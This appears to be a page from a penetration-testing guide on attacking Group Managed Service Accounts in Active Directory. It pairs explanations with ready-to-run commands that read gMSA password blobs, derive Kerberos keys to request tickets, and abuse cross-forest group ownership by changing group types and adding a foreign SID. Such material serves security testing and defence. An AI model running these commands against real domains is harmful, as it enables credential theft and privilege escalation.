---
title: "06 · gMSA Attacks"
---

# 06 · gMSA Attacks

> Group Managed Service Accounts have rotating passwords stored in AD, readable by allowed principals.

!!! note "Phase overview"
    `gMSAs` solve the problem of service accounts with stale passwords by letting the KDC manage and rotate them. The trade-off: the password blob (msDS-ManagedPassword) is stored in AD and any principal in ***`msDS-GroupMSAMembership1`*** can read it. Once you read it, you can derive both the NT hash AND the AES keys, which lets you authenticate as the gMSA via every Kerberos flavor.

### 6.1 · Read gMSA Password

!!! info "Why this works / how it chains"

    The ***`msDS-ManagedPassword`*** attribute is a binary blob containing the current and previous passwords. Several tools handle the blob unpacking: netexec --gmsa is fastest, gMSADumper is the canonical tool, and bloodyAD/ldapsearch work when you only have a TGT.

!!! warning "What leads here"
    - BloodHound shows ReadGMSAPassword edge to a gMSA
    - Your account is in the gMSA's allowed principals list
    - msDS-GroupMSAMembership contains your SID (directly or via group)

```bash title="Multiple read methods"
# Some examples:

# Check who can read gMSA password
bloodyAD get object 'gMSA_account$' --attr msDS-GroupMSAMembership

# Read password (must have ReadGMSAPassword rights)
# Method 1: netexec
netexec ldap dc01.domain.local -u user -p pass --gmsa

# Method 2: gMSADumper
python3 /opt/gMSADumper/gMSADumper.py \
  -u user -p pass -d domain.local -l dc01.domain.local

# Method 3: bloodyAD (Kerberos)
KRB5CCNAME=user.ccache faketime -f "+7h" \
  bloodyAD -u user -k -d domain.local \
  --host dc01.domain.local \
  get object 'gMSA_account$' --attr msDS-ManagedPassword

# Method 4: ldapsearch with GSSAPI
KRB5CCNAME=user.ccache faketime -f "+7h" \
  ldapsearch -H ldap://dc01.domain.local \
  -Y GSSAPI \
  -b "DC=domain,DC=local" \
  "(sAMAccountName=gMSA_account$)" \
  msDS-ManagedPassword msDS-ManagedPasswordID
```


### 6.2 · Derive gMSA Keys from Password Blob

!!! info "Why this works / how it chains"

    Some environments enforce AES-only Kerberos (no RC4). The NT hash alone won't get you a TGT in that case you need AES128/AES256 keys derived from the cleartext password. The dumper extracts the cleartext from the blob, which you can then hand to impacket-getTGT with -aesKey.

!!! warning "What leads here"
    - Got msDS-ManagedPassword blob (from 6.1)
    - Need AES keys, not just NT hash, for Kerberos-only environments

```bash title="Derive keys → TGT"
# gMSADumper outputs all keys (NT, AES128, AES256)
python3 gMSADumper.py -u user -p pass \
  -d domain.local -l dc01 \
  -k  # also computes Kerberos keys

# Use AES key for getTGT (some env. require AES, not NT)
faketime -f "+7h" impacket-getTGT \
  domain.local/'gMSA_account$' \
  -aesKey <AES256_KEY> \
  -dc-ip <IP>
```


### 6.3 · Cross-Forest gMSA Manager Group Abuse

!!! info "Why this works / how it chains"

    Cross-forest, you can't just add your foreign SID to a Global group; Global groups can't contain foreign principals. Solution: convert the group via Global → Universal → DomainLocal (each step is a single bit-flip on groupType), then add your foreign SID. The group now grants ReadGMSAPassword to a foreign principal (you), and you read the gMSA password.

!!! warning "What leads here"
    - You OWN (not just member of) a group that controls gMSA membership in another forest
    - Owner has implicit WriteDACL → grant yourself GenericAll

```bash title="Convert group type + add foreign SID"
# Grant yourself GenericAll on the group
bloodyAD add genericAll 'gMSA Managers' 'YourSID'

# Global groups can't have foreign SIDs → convert to DomainLocal
# Global → Universal
bloodyAD set object 'CN=gMSA Managers,...' \
  groupType -v -2147483640  # 0x80000008 = Universal

# Universal → DomainLocal
bloodyAD set object 'CN=gMSA Managers,...' \
  groupType -v -2147483644  # 0x80000004 = DomainLocal

# Add cross-forest SID as member
bloodyAD add groupMember 'CN=gMSA Managers,...' 'ForeignUserSID'

# Now you have ReadGMSAPassword → read the password
```

